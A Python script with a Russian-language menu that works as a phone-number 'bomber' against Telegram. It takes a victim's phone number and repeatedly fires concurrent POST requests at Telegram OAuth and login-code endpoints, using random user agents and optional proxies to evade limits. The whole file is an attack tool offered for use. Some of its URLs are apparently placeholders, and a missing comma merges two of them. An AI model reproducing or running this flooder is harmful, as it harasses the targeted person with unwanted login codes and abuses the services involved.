import requests
import fake_useragent
import pyfiglet
from termcolor import colored
import os
import concurrent.futures

PROXY_FILE = "proxies.txt"


ascii_banner = pyfiglet.figlet_format("Pharelis")
colored_banner = colored(ascii_banner, color='magenta')
print(colored_banner)
print("By @fckPharelis\n")

def send_request(url, phone_number, proxy=None):
    try:
        user_agent = fake_useragent.UserAgent().random
        headers = {'user-agent': user_agent}
        data = {'phone': phone_number}

        request_args = {'headers': headers, 'data': data}
        if proxy:
            request_args['proxies'] = {"http": proxy, "https": proxy}
        
        response = requests.post(url, **request_args)
        if response.status_code == 200:
            print(colored(f"Запрос успешно отправлен на {url}" + (f" через прокси {proxy}" if proxy else ""), 'green'))
        else:
            print(colored(f"Ошибка: статус {response.status_code} для {url}" + (f" через прокси {proxy}" if proxy else ""), 'red'))
    except Exception as e:
        print(colored(f"[!] Ошибка при отправке запроса" + (f" через прокси {proxy}" if proxy else "") + f": {e}", 'red'))

def send_requests(phone_number, repeat_count, use_proxies):
    urls = [
                'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                'https://translations.telegram.org/auth/request',
                'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                'https://my.telegram.org/auth/send_password'
'https://oauth.telegram.org/auth/request?bot_id=567812345&origin=https%3A%2F%2Fexample.com&embed=1&request_access=write&return_to=https%3A%2F%2Fexample.com%2Flogin',

'https://oauth.telegram.org/auth?bot_id=123456789&origin=https%3A%2F%2Fshop.com&embed=1&request_access=write&return_to=https%3A%2F%2Fshop.com%2Fcheckout',

'https://oauth.telegram.org/auth/request?bot_id=987654321&origin=https%3A%2F%2Fblogsite.com&embed=1&return_to=https%3A%2F%2Fblogsite.com%2Fdashboard',

'https://oauth.telegram.org/auth/request?bot_id=741852963&origin=https%3A%2F%2Fsocialapp.com&embed=1&request_access=write&return_to=https%3A%2F%2Fsocialapp.com%2Fuser%2Fsettings',

'https://oauth.telegram.org/auth/request?bot_id=852369741&origin=https%3A%2F%2Fnewsportal.com&embed=1&return_to=https%3A%2F%2Fnewsportal.com%2Fsubscription',

'https://oauth.telegram.org/auth?bot_id=963852741&origin=https%3A%2F%2Fecommerce.com&embed=1&request_access=write&return_to=https%3A%2F%2Fecommerce.com%2Fmyaccount',

'https://oauth.telegram.org/auth/request?bot_id=321654987&origin=https%3A%2F%2Fcloudservice.com&embed=1&request_access=write&return_to=https%3A%2F%2Fcloudservice.com%2Fdashboard',

'https://oauth.telegram.org/auth/request?bot_id=123789456&origin=https%3A%2F%2Fcommunityforum.com&embed=1&return_to=https%3A%2F%2Fcommunityforum.com%2Fuser%2Fprofile',

'https://oauth.telegram.org/auth/request?bot_id=456123789&origin=https%3A%2F%2Ftravelservice.com&embed=1&request_access=write&return_to=https%3A%2F%2Ftravelservice.com%2Fbooking',

'https://oauth.telegram.org/auth/request?bot_id=654789123&origin=https%3A%2F%2Flanguagesite.com&embed=1&return_to=https%3A%2F%2Flanguagesite.com%2Fcourses',

'https://oauth.telegram.org/auth/request?bot_id=159753486&origin=https%3A%2F%2Ffashionshop.com&embed=1&request_access=write&return_to=https%3A%2F%2Ffashionshop.com%2Fnewarrivals',

'https://oauth.telegram.org/auth/request?bot_id=753951486&origin=https%3A%2F%2Fgaminghub.com&embed=1&request_access=write&return_to=https%3A%2F%2Fgaminghub.com%2Fleaderboard',

'https://oauth.telegram.org/auth/request?bot_id=159159159&origin=https%3A%2F%2Flearnportal.com&embed=1&return_to=https%3A%2F%2Flearnportal.com%2Fmy-courses'
            ]
    
    proxies = load_proxies() if use_proxies else [None]
    if use_proxies and not proxies:
        print(colored("Нет доступных прокси для отправки запросов.", 'red'))
        return

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for i in range(repeat_count):
            futures = []
            for url in urls:
                for proxy in proxies:
                    futures.append(executor.submit(send_request, url, phone_number, f"http://{proxy}" if proxy else None))
            for future in concurrent.futures.as_completed(futures):
                future.result()  # Получаем результат для обработки ошибок
            print(colored(f"[Цикл {i+1}/{repeat_count}] Все запросы отправлены!", 'green'))

def load_proxies():
    """Загружает список прокси из файла."""
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def add_proxies():
    """Добавляет список прокси в файл."""
    proxies = input("Введите список прокси (каждый в новом рядке):\n")
    with open(PROXY_FILE, "a") as f:
        f.write(proxies + "\n")
    print(colored("Прокси успешно добавлены.", 'green'))

def view_proxies():
    """Отображает список прокси."""
    proxies = load_proxies()
    if proxies:
        print(colored("Список прокси:", 'cyan'))
        for proxy in proxies:
            print(proxy)
    else:
        print(colored("Список прокси пуст.", 'red'))

def delete_proxies():
    """Удаляет файл с прокси."""
    if os.path.exists(PROXY_FILE):
        os.remove(PROXY_FILE)
        print(colored("Список прокси удален.", 'green'))
    else:
        print(colored("Список прокси уже пуст.", 'red'))

def main_menu():
    """Основное меню выбора."""
    while True:
        print("\n" + colored("Меню:", 'yellow'))
        print("1. Атака")
        print("2. Управление прокси")
        print("3. Выход")
        
        choice = input(colored("Выберите опцию: ", 'yellow'))
        
        if choice == '1':
            phone_number = input(colored("Введите номер телефона: ", 'yellow'))
            repeat_count = int(input(colored("Введите количество циклов: ", 'yellow')))
            use_proxies = input(colored("Использовать прокси? (да/нет): ", 'yellow')).strip().lower() == 'да'
            send_requests(phone_number, repeat_count, use_proxies)
        elif choice == '2':
            proxy_menu()
        elif choice == '3':
            print(colored("Выход из программы...", 'yellow'))
            break
        else:
            print(colored("Некорректный выбор. Попробуйте снова.", 'red'))

def proxy_menu():
    """Меню управления прокси."""
    while True:
        print("\n" + colored("Управление прокси:", 'yellow'))
        print("1. Добавить прокси")
        print("2. Посмотреть список прокси")
        print("3. Удалить список прокси")
        print("4. Назад")
        
        choice = input(colored("Выберите опцию: ", 'yellow'))
        
        if choice == '1':
            add_proxies()
        elif choice == '2':
            view_proxies()
        elif choice == '3':
            delete_proxies()
        elif choice == '4':
            break
        else:
            print(colored("Некорректный выбор. Попробуйте снова.", 'red'))

if __name__ == "__main__":
    main_menu()